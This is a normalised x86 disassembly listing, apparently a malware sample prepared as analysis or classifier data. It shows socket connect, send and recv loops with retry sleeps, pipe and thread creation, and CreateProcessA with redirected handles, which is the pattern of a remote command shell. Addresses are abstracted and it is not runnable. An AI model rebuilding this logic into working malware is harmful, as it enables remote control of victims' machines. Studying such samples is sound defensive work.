mov ecx rw-data
mov edx rw-data
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push 0xea60
call [ Sleep@IAT ]
jmp r-xdata
je r-xdata
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
call sub_710010c0
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
mov [ ebp - 0x238 ] rw-data
mov [ ebp - 0x14 ] rw-data
push 0x0
push 0x1
push 0x2
call socket
mov [ rw-data ] eax
cmp [ rw-data ] 0xffffffff
jne r-xdata
je r-xdata
cmp [ ebp - 0x3e8 ] 0x1
jne r-xdata
mov ecx 0x3
jne r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
call [ atol@IAT ]
add esp 0x4
push eax
call htons
mov [ ebp - 0x3e2 ] ax
mov [ ebp - 0x3e4 ] 0x2
mov edx [ ebp - 0x238 ]
push edx
call inet_addr
mov [ ebp - 0x3e0 ] eax
push 0x10
lea eax [ ebp - 0x3e4 ]
push eax
mov ecx [ rw-data ]
push ecx
call connect
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
jne r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push edx
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push edx
call closesocket
xor eax eax
mov [ ebp - 0x25e4 ] eax
mov [ ebp - 0x25e0 ] eax
mov [ ebp - 0x25dc ] eax
mov [ ebp - 0x25d8 ] eax
mov [ ebp - 0x25d4 ] eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffb
push ecx
push rw-data
lea ecx [ ebp - 0x25e4 ]
push ecx
call [ strncpy@IAT ]
add esp 0xc
lea edx [ ebp - 0x25e4 ]
push edx
call [ atof@IAT ]
add esp 0x4
fmul [ r--data ]
call _ftol
push rw-data
call sub_71005420
add esp 0x4
clc
jae r-xdata
lea ecx [ ebp - 0x46f4 ]
call sub_710017f0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x46f4 ]
call sub_71001a80
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
lea ecx [ ebp - 0x46f4 ]
call sub_71001890
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx 0x800
xor eax eax
lea edi [ ebp - 0x46e8 ]
[ edi ]
mov ecx [ rw-data ]
mov esi rw-data
lea edi [ ebp - 0x46e8 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ rw-data ]
mov [ ebp - 0x46ec ] eax
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx [ rw-data ]
push ecx
push rw-data
push rw-data
call [ sprintf@IAT ]
add esp 0xc
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
push 0x0
mov edx [ rw-data ]
push edx
push rw-data
mov eax [ rw-data ]
push eax
call send
cmp eax 0x1
jge r-xdata
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
0x3b9e8 0x0
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
push 0x80
lea eax [ ebp - 0x25d0 ]
push eax
call gethostname
test eax eax
jne r-xdata
push 0x0
call [ time@IAT ]
add esp 0x4
push eax
call [ srand@IAT ]
add esp 0x4
call [ rand@IAT ]
cdq
mov ecx 0x28
idiv ecx
imul edx edx 0xea60
push edx
call [ Sleep@IAT ]
push rw-data
call gethostbyname
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
je r-xdata
jmp r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
call 0x7103ff35
add [ eax ] al
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
push 0x0
push 0x2000
push rw-data
mov eax [ rw-data ]
push eax
call recv
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jge r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
push rw-data
mov ecx [ rw-data ]
push ecx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
lea edi [ ebp - 0x25d0 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ ebp - 0x25d0 ]
push eax
call gethostbyname
mov [ ebp - 0x254c ] eax
mov [ ebp - 0x23f0 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0xc ]
mov ecx [ eax ]
mov edx [ ecx ]
push edx
call inet_ntoa
mov [ ebp - 0x24 ] eax
mov ecx 0xc
xor eax eax
mov edi rw-data
[ edi ]
stosw [ edi ]
mov edi [ ebp - 0x24 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
push 0x927c0
call [ Sleep@IAT ]
call WSACleanup
jmp r-xdata
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
jne r-xdata
push eax
call [ Sleep@IAT ]
jmp r-xdata
dec esp
add [ eax ] al
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov ecx 0x80
xor eax eax
lea edi [ ebp - 0x228 ]
[ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffb
mov esi rw-data
lea edi [ ebp - 0x228 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ ebp - 0x3e8 ] 0x1
jne r-xdata
mov eax [ rw-data ]
push eax
push rw-data
call sub_71001fe0
add esp 0x8
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
jmp r-xdata
mov [ ebp - 0x24f4 ] 0x0
push 0x0
mov edx [ rw-data ]
push edx
call shutdown
mov eax [ rw-data ]
push eax
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
cmp [ ebp - 0x254c ] 0x0
je r-xdata
lea edx [ ebp - 0x3c8 ]
push edx
push 0x101
call WSAStartup
mov [ ebp - 0x22c ] eax
cmp [ ebp - 0x22c ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
jmp r-xdata
je r-xdata
mov [ ebp - 0x4708 ] 0x0
cmp [ ebp - 0x2504 ] 0x0
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x4700 ]
call sub_710017f0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x4700 ]
call sub_71001a80
lea ecx [ ebp - 0x228 ]
push ecx
call [ atoi@IAT ]
add esp 0x4
mov [ ebp - 0x46f8 ] eax
cmp [ ebp - 0x46f8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
jmp r-xdata
mov eax [ ebp - 0x46ec ]
push eax
lea ecx [ ebp - 0x46e8 ]
push ecx
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
xor ecx ecx
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x24f4 ]
mov edx [ rw-data ]
mov [ ebp + ecx * 4 - 0x24f0 ] edx
mov eax [ ebp - 0x24f4 ]
add eax 0x1
mov [ ebp - 0x24f4 ] eax
mov edx [ ebp - 0x254c ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x23f0 ]
cmp [ eax + ecx * 4 ] 0x0
je r-xdata
call sub_71004b30
mov [ ebp - 0x3e8 ] eax
cmp [ ebp - 0x3e8 ] 0x0
jne r-xdata
push 0x1b7740
call [ Sleep@IAT ]
jmp r-xdata
jne r-xdata
push 0x0
lea edx [ ebp - 0x3d4 ]
push edx
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
int3
mov eax rw-data
mov ecx rw-data
mov dx [ ecx ]
cmp dx [ eax ]
jne r-xdata
jne r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push sub_71004bd0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x2504 ] eax
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea eax [ ebp - 0x4708 ]
push eax
mov ecx [ ebp - 0x2504 ]
push ecx
call [ GetExitCodeThread@IAT ]
mov [ ebp - 0x4704 ] eax
cmp [ ebp - 0x4704 ] 0x0
je r-xdata
mov eax [ ebp - 0x46f8 ]
push eax
lea ecx [ ebp - 0x4700 ]
call sub_71001cb0
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea edx [ ebp - 0x228 ]
push edx
lea ecx [ ebp - 0x4700 ]
call sub_71001de0
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
jmp r-xdata
cmp [ ebp - 0x24f4 ] 0x40
jae r-xdata
lea edx [ ebp - 0x234 ]
push edx
push 0x0
push 0x0
lea eax [ ebp - 0x24f4 ]
push eax
push 0x0
call select
test eax eax
jne r-xdata
mov edx [ ebp - 0x254c ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x23f0 ]
mov edx [ eax + ecx * 4 ]
mov eax [ edx ]
push eax
call inet_ntoa
mov [ ebp - 0x2550 ] eax
mov edi [ ebp - 0x2550 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
cmp [ ebp - 0x3e8 ] 0x1
jne r-xdata
jmp r-xdata
mov edx rw-data
mov eax rw-data
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
je r-xdata
push 0x0
lea edx [ ebp - 0x3d4 ]
push edx
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
je r-xdata
mov [ ebp - 0x4710 ] 0x0
cmp [ ebp - 0x23ec ] 0x0
je r-xdata
jmp r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
cmp [ ebp - 0x4708 ] 0x103
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov [ ebp - 0x28 ] 0x0
mov ecx 0x13
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
lea eax [ ebp - 0x24f4 ]
push eax
mov ecx [ rw-data ]
push ecx
call __WSAFDIsSet
test eax eax
je r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x23f0 ]
add ecx 0x1
mov [ ebp - 0x23f0 ] ecx
push 0x0
push 0x0
call [ InternetGetConnectedState@IAT ]
test eax eax
jne r-xdata
call sub_71001000
mov [ ebp - 0x1c ] rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jb r-xdata
mov [ ebp - 0x26b4 ] 0x0
mov [ ebp - 0x26ac ] 0x0
mov ecx 0x11
xor eax eax
lea edi [ ebp - 0x26a0 ]
[ edi ]
lea edx [ ebp - 0x26a0 ]
push edx
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x26a0 ] 0x44
mov [ ebp - 0x2674 ] 0x101
mov [ ebp - 0x2670 ] 0x0
push 0x14
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x2650 ] eax
push 0x14
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x26b0 ] eax
push 0x14
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x26a8 ] eax
push 0x32
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x264c ] eax
push 0x64
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x2654 ] eax
xor eax eax
mov ecx [ ebp - 0x2650 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
xor edx edx
mov eax [ ebp - 0x26b0 ]
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
xor ecx ecx
mov edx [ ebp - 0x26a8 ]
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] ecx
mov ecx 0xc
xor eax eax
mov edi [ ebp - 0x264c ]
[ edi ]
stosw [ edi ]
mov ecx 0x19
xor eax eax
mov edi [ ebp - 0x2654 ]
[ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffb
push ecx
push rw-data
mov eax [ ebp - 0x2654 ]
push eax
call [ strncpy@IAT ]
add esp 0xc
mov [ ebp - 0x23f0 ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx 0x11
xor eax eax
lea edi [ ebp - 0x2638 ]
[ edi ]
lea edx [ ebp - 0x2638 ]
push edx
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x2638 ] 0x44
mov [ ebp - 0x260c ] 0x101
mov [ ebp - 0x2608 ] 0x0
mov eax [ rw-data ]
mov [ ebp - 0x25f8 ] eax
mov ecx [ rw-data ]
mov [ ebp - 0x2600 ] ecx
mov edx [ rw-data ]
mov [ ebp - 0x25fc ] edx
lea eax [ ebp - 0x25f4 ]
push eax
lea ecx [ ebp - 0x2638 ]
push ecx
push 0x0
push 0x0
push 0x10
push 0x1
push 0x0
push 0x0
mov edx [ ebp - 0x1c ]
push edx
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x5
mov edi rw-data
jne r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push sub_710064d0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x23ec ] eax
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea eax [ ebp - 0x4710 ]
push eax
mov ecx [ ebp - 0x23ec ]
push ecx
call [ GetExitCodeThread@IAT ]
mov [ ebp - 0x470c ] eax
cmp [ ebp - 0x470c ] 0x0
je r-xdata
int3
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ ebp - 0x2504 ]
push edx
call [ CloseHandle@IAT ]
mov [ ebp - 0x2504 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4700 ]
call sub_71001800
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4700 ]
call sub_71001800
jmp r-xdata
mov edx [ rw-data ]
push edx
push rw-data
call sub_71001fe0
add esp 0x8
mov eax rw-data
mov ecx rw-data
mov edx [ ecx ]
cmp edx [ eax ]
je r-xdata
push 0x0
push 0x2000
push rw-data
mov edx [ rw-data ]
push edx
call recv
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jge r-xdata
call sub_71005c90
push rw-data
call gethostbyname
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
push 0x927c0
call [ Sleep@IAT ]
call WSACleanup
jmp r-xdata
mov ecx 0x7
mov edi rw-data
jae r-xdata
mov edi [ ebp - 0x2654 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x23f0 ] ecx
jge r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push 0x0
push sub_71005200
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push edx
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4718 ] 0x0
cmp [ ebp - 0x2500 ] 0x0
je r-xdata
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
call sub_71004f8a
add [ edi + rw-data ] bh
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
cmp [ ebp - 0x4710 ] 0x103
je r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push 0x0
push sub_71004b80
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call inet_ntoa
mov [ ebp - 0x24 ] eax
mov ecx 0xc
xor eax eax
mov edi rw-data
[ edi ]
stosw [ edi ]
mov edi [ ebp - 0x24 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push 0x927c0
call [ Sleep@IAT ]
call WSACleanup
jmp r-xdata
clc
nop
jae r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
call sub_710042bf
add [ edi + rw-data ] bh
mov ecx [ ebp - 0x23f0 ]
add ecx 0x1
mov [ ebp - 0x2658 ] ecx
jmp r-xdata
mov edx [ ebp - 0x2654 ]
add edx [ ebp - 0x23f0 ]
movsx eax [ edx ]
cmp eax 0x2d
je r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push sub_71006ae0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x2500 ] eax
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x4718 ]
push ecx
mov edx [ ebp - 0x2500 ]
push edx
call [ GetExitCodeThread@IAT ]
mov [ ebp - 0x4714 ] eax
cmp [ ebp - 0x4714 ] 0x0
je r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ ebp - 0x23ec ]
push edx
call [ CloseHandle@IAT ]
mov [ ebp - 0x23ec ] 0x0
jmp r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
call 0x7103f813
add [ eax ] al
mov [ ebp - 0x26b8 ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
inc ecx
push ecx
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x26b8 ] eax
cmp [ ebp - 0x26b8 ] 0x0
je r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
